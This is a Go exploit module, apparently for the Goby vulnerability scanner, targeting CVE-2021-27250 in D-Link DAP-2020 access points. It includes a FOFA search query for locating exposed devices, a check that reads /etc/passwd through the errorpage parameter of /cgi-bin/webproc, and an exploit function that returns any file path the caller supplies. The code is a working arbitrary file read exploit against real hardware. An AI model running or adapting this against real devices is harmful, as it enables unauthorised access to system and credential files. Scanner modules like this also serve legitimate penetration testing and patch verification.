package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "D-Link DAP-2020 File Read (CVE-2021-27250)",
    "Description": "CVE-2021-27250 File Read，Since the vulnerability affects core components, other versions may also be affected by this vulnerability.",
    "Impact": "D-Link DAP-2020 File Read (CVE-2021-27250)",
    "Recommendation": "<p>The manufacturer has provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201\">https:/ /supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201</a></p>",
    "Product": "D_Link-DAP-2020",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "D-Link DAP-2020 webproc 文件 errorpage 参数任意文件读取漏洞 (CVE-2021-27250)",
            "Description": "<p><span style=\"font-size: 16.96px;\">D-Link DAP-2020 是友讯科技开发的一款<span style=\"color: rgb(32, 33, 36); font-size: 16px;\">无线N接入点。D-Link DAP-2020存在任意文件读取漏洞，攻击者<span style=\"font-size: 16px;\">可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</span></span></span><br></p>",
            "Impact": "<p><span style=\"font-size: 16px;\">攻击者可通过该漏洞读取泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。 </span><br></p>",
            "Recommendation": "<p>厂商已提供漏洞修补方案，请关注厂商主页及时更新： <a href=\"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201\">https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201</a><br></p>",
            "Product": "D_Link-DAP-2020",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "D-Link DAP-2020 File Read (CVE-2021-27250)",
            "Description": "CVE-2021-27250 File Read，Since the vulnerability affects core components, other versions may also be affected by this vulnerability.",
            "Impact": "D-Link DAP-2020 File Read (CVE-2021-27250)",
            "Recommendation": "<p>The manufacturer has provided a vulnerability patching solution, please pay attention to the manufacturer's homepage for timely updates: <a href=\"https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201\">https:/ /supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201</a><br></p>",
            "Product": "D_Link-DAP-2020",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "title=\"D-LINK\"&&body=\"/cgi-bin/webproc\"",
    "GobyQuery": "title=\"D-LINK\"&&body=\"/cgi-bin/webproc\"",
    "Author": "misakikatas@gmail.com",
    "Homepage": "http://www.dlink.com",
    "DisclosureDate": "2021-05-27",
    "References": [
        "http://www.dlink.com"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "7.5",
    "CVEIDs": [
        "CVE-2021-27250"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filePath",
            "type": "input",
            "value": "/etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10215"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/cgi-bin/webproc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = "getpage=html/index.html&errorpage=/etc/passwd&var:menu=setup&var:page=wizard&var:login=true&obj-action=auth&:username=admin&:password=test&:action=login&:sessionid=365dfaef"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "root:x:0:0")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			filePath := ss.Params["filePath"].(string)
			uri := "/cgi-bin/webproc"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.VerifyTls = false
			cfg.Data = fmt.Sprintf("getpage=html/index.html&errorpage=%s&var:menu=setup&var:page=wizard&var:login=true&obj-action=auth&:username=admin&:password=test&:action=login&:sessionid=365dfaef", url.QueryEscape(filePath))
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
